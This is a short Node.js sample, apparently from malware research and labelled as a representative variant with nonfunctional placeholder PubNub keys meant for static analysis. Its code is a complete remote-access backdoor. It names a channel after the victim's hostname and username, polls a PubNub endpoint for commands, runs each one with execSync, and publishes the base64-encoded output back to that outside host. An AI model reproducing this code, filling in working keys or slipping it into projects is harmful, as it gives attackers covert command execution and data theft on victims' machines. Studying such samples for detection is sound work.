// Representative language/platform variant, not recovered campaign code.
// Placeholder PubNub keys are deliberately nonfunctional. Static analysis only.
const axios = require('axios');
const child = require('child_process');
const os = require('os');
async function run() {
  const channel = os.hostname() + '-' + os.userInfo().username;
  let cursor = '0';
  while (true) {
    const response = await axios.get('https://ps42.pndsn.com/subscribe/sub-c-replaced/' + channel + '/0/' + cursor);
    cursor = response.data[1];
    if (response.data[0].length) {
      const output = child.execSync(response.data[0][0]);
      const encoded = output.toString('base64');
      const message = encodeURIComponent(JSON.stringify(encoded));
      await axios.get('https://ps42.pndsn.com/publish/pub-c-fixture/sub-c-replaced/0/' + channel + '/0/' + message);
    }
  }
}
run();
